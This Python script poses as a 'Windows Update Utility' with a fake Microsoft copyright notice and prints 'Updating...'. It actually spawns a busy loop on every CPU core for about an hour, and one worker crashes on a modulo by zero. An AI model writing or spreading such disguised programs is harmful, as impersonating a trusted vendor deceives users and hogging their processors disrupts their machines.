from multiprocessing import Pool
from multiprocessing import cpu_count
import time
import os

print('Windows Update Utility')
print('Copyright (c) 2003-2021 Microsoft Corporation')

def f(x):
    set_time = 1
    timeout = time.time() + 60*float(set_time)  # X minutes from now
    while True:
        if time.time() > timeout:
            break
        x%x

if __name__ == '__main__':
    processes = cpu_count()
    #print ('utilizing %d cores\n' % processes)
    print("Updating...")
    pool = Pool(processes)
    pool.map(f, range(processes))
